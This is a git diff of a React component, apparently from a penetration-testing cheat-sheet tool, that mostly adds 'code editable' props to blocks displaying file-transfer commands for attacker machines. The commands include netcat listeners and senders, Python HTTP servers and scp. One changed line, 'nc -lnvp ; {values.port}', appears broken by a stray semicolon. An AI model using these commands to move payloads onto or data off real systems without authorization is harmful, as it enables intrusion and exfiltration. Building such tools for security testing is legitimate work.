@@ -81,7 +81,7 @@ export default function FileTransfer() {
 					Bash Upload <IconFont type='icon-gnubash' />
 				</Title>
 				<Text strong># Upload file over HTTP (require HTTP service running on the attacker machine)</Text>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{bash_transfer}
 				</Paragraph>
 				<Text strong style={{ marginTop: '1em' }}>
@@ -93,18 +93,18 @@ export default function FileTransfer() {
 				<Paragraph copyable>
 					nc -l -p {values.port} {'>'} data
 				</Paragraph>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{bash_tcp_transfer}
 				</Paragraph>
 				<Title level={3}>
 					Bash Download <IconFont type='icon-gnubash' />
 				</Title>
 				<Text strong># Send via netcat</Text>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					nc -l -p {values.port} {'<'} {values.file_name}
 				</Paragraph>
 				<Text strong># Download file on the other machine</Text>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{bash_download}
 				</Paragraph>
 			</div>
@@ -114,17 +114,17 @@ export default function FileTransfer() {
 					Netcat <IconFont type='icon-command-line' />
 				</Title>
 				<Text strong># Upload payload</Text>
-				<Paragraph>nc -lnvp {values.port}</Paragraph>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
+					nc -lnvp ; {values.port}
 					{netcat_transfer}
 				</Paragraph>
 				<Text strong style={{ marginTop: '2em' }}>
 					# Download
 				</Text>
-				<Paragraph copyable ellipsis>
+				<Paragraph copyable code editable ellipsis>
 					nc {values.ip} {values.port} {'<'} {values.file_name}
 				</Paragraph>
-				<Paragraph copyable ellipsis>
+				<Paragraph copyable code editable ellipsis>
 					nc -lnvp {values.port} {'>'} file_saved
 				</Paragraph>
 			</div>
@@ -140,11 +140,11 @@ export default function FileTransfer() {
 					Python <IconFont type='icon-python' />
 				</Title>
 				<Text strong># Python3 HTTP Server</Text>
-				<Paragraph copyable ellipsis={true} style={{ marginBottom: '1em' }}>
+				<Paragraph copyable code editable ellipsis={true} style={{ marginBottom: '1em' }}>
 					{python_server}
 				</Paragraph>
 				<Text strong># Python2 HTTP Server</Text>
-				<Paragraph copyable ellipsis>
+				<Paragraph copyable code editable ellipsis>
 					{python2_server}
 				</Paragraph>
 			</div>
@@ -160,11 +160,11 @@ export default function FileTransfer() {
 					SCP <IconFont type='icon-filelock' />
 				</Title>
 				<Text strong># Upload from local host to remote computer</Text>
-				<Paragraph copyable ellipsis={true} style={{ marginBottom: '1em' }}>
+				<Paragraph copyable code editable ellipsis={true} style={{ marginBottom: '1em' }}>
 					{scp}
 				</Paragraph>
 				<Text strong># Download from remote computer</Text>
-				<Paragraph copyable ellipsis={true} style={{ marginBottom: '1em' }}>
+				<Paragraph copyable code editable ellipsis={true} style={{ marginBottom: '1em' }}>
 					{scp_dl}
 				</Paragraph>
 			</div>
